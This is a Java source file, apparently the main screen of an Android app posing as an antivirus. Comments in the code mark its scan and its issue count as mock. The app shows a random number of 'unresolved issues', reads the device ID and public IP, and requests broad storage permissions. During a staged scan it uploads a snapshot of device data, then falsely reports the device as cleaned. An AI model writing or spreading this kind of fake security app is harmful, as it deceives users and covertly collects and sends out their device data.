package com.ryan.antivirusapp;


import static android.Manifest.permission.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.interpolator.view.animation.FastOutSlowInInterpolator;
import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.animation.ArgbEvaluator;
import android.animation.ObjectAnimator;
import android.animation.PropertyValuesHolder;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import com.google.android.material.progressindicator.CircularProgressIndicator;
import com.google.android.material.snackbar.Snackbar;
import com.ryan.antivirusapp.SaveObj.SaveObject;
import com.ryan.antivirusapp.Utils.PublicIP;
import com.ryan.antivirusapp.Utils.PermissionHandler;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    // Views
    Button btnScan;
    CircularProgressIndicator progress;

    // Mock data
    TextView txtCount;
    TextView txtDate;

    // Utils
    PermissionHandler handler;
    PublicIP ip;

    // Permissions
    String[] requiredPermissions;
    String[] deniedPermissions;

    // Save Objects
    SaveObject saveObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Bind the UI elements (views)
        Button btnScan = findViewById(R.id.button_start);
        btnScan.setText("Loading...");
        btnScan.setBackgroundColor(getColor(R.color.orange));
        progress = findViewById(R.id.progress_circular);
        txtCount = findViewById(R.id.text_count);
        txtDate = findViewById(R.id.txtDate);

        // Unique device id
        TextView txtId = findViewById(R.id.text_device_id);
        txtId.setText("Your unique device ID: " + Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID));

        // Set mock data
        Random rand = new Random();
        txtCount.setText("You have " + rand.nextInt(10) + " unresolved issues");
        progress.setVisibility(View.INVISIBLE);

        // Init external IP
        ip = new PublicIP(this, btnScan);

        // Init permissions
        handler = new PermissionHandler();
        requiredPermissions = handler.initPermissions();
        deniedPermissions = handler.checkPermissions(this, requiredPermissions);

        // Direct to prompting missing permissions
        handler.promptPermissions(this, deniedPermissions, getString(R.string.permission_prompt_title), getString(R.string.permission_prompt_message));

        // Scan button ON-CLICK
        btnScan.setOnClickListener(view -> {
            if(ip.publicIp == null){
                Snackbar.make(btnScan, "Application is loading. Please wait.", Snackbar.LENGTH_SHORT).show();
                return;
            }

            handler.checkSpecialPermission(this, MANAGE_EXTERNAL_STORAGE);

            // Mock animation
            progress.setVisibility(View.VISIBLE);
            progress.setIndeterminate(true);

            progress.setAlpha(0);
            progress.animate()
                    .alpha(1f)
                    .setDuration(400);

            btnScan.setText("Scanning...");
            btnScan.setBackgroundColor(getColor(R.color.orange));

            // Run the application on a new thread
            new Thread(() -> {
                saveObject = new SaveObject(this);
                saveObject.init();
                saveObject.snapshotData.setExternalIp(ip.publicIp);
                saveObject.snapshotData.setSnapshotDate(new Date());
                try {
                    Thread.sleep(5000);
                    saveObject.upload();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                runOnUiThread(() -> {
                    // Text views
                    String date = new SimpleDateFormat("dd/MM/yyyy").format(new Date());
                    TextView txtDate = findViewById(R.id.txtDate);
                    txtDate.setText("Last scanned: " + date);
                    TextView txtCount = findViewById(R.id.text_count);
                    txtCount.setText("Device has been cleaned");
                    Button btnScan_ = findViewById(R.id.button_start);
                    btnScan_.setText("Complete");
                    crossfadeColor(btnScan_);

                    // Progress view
                    CircularProgressIndicator prog = findViewById(R.id.progress_circular);
                    prog.setIndeterminate(false);
                    prog.setProgress(100, true);

                    // Icon
                    ImageView imgIcon = findViewById(R.id.image_shield);
                    imgIcon.animate()
                            .setDuration(400).scaleX(0).scaleY(0).setListener(new AnimatorListenerAdapter() {
                                @Override
                                public void onAnimationEnd(Animator animation) {
                                    super.onAnimationEnd(animation);
                                    imgIcon.setImageDrawable(getDrawable(R.drawable.ic_baseline_check_circle_24));
                                    imgIcon.animate().scaleX(1).scaleY(1).setDuration(400).start();
                                }
                            }).start();

                    // Animations
                    pulsateView(prog, 1.2f, 2, 400);
                });
            }).start();

        });
    }

    void pulsateView(View view, float scale, int repeatCount, int duration){
        ObjectAnimator scaleDown = ObjectAnimator.ofPropertyValuesHolder(
                view,
                PropertyValuesHolder.ofFloat("scaleX", scale),
                PropertyValuesHolder.ofFloat("scaleY", scale));
        scaleDown.setInterpolator(new FastOutSlowInInterpolator());
        scaleDown.setDuration(duration);
        scaleDown.setRepeatCount(repeatCount);
        scaleDown.setRepeatMode(ObjectAnimator.REVERSE);
        scaleDown.start();
    }

    void crossfadeColor(View view){
        ObjectAnimator colorFade = ObjectAnimator.ofObject(view, "backgroundColor", new ArgbEvaluator(), getColor(R.color.orange), getColor(R.color.blue_light));
        colorFade.setDuration(400);
        colorFade.start();
    }
}